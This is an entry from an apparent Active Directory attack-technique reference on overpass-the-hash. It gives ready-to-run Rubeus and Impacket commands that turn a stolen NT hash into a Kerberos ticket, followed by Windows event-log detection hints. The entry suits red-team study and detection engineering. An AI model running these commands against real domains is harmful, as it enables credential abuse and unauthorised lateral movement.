---
id: opth
type: technique
label: "Overpass-the-hash"
phase: "lateral"
tools: ["rubeus", "mimikatz"]
cve: null
detect: "4768 issued immediately from a non-interactive context."
mitre: "T1550.002"
tag: null
---


# Overpass-the-hash

### Affected object / attribute
**Kerberos TGT request** using an NT hash.

### Concept (deep)
Use an NT hash to request a **Kerberos TGT** (RC4/`asktgt`), then authenticate with Kerberos — bypasses NTLM restrictions and enables Kerberos-only targets.

### Commands
```bash
# ── Rubeus asktgt ────────────────────────────────────────────────────
Rubeus.exe asktgt /user:administrator /rc4:<nt> /ptt

# ── Impacket getTGT ──────────────────────────────────────────────────
impacket-getTGT corp.local/administrator -hashes :<nt> -dc-ip 10.10.10.5
export KRB5CCNAME=administrator.ccache
```

### Detection
**4768 with `TicketEncryptionType=0x17`** for accounts that normally use AES.

---
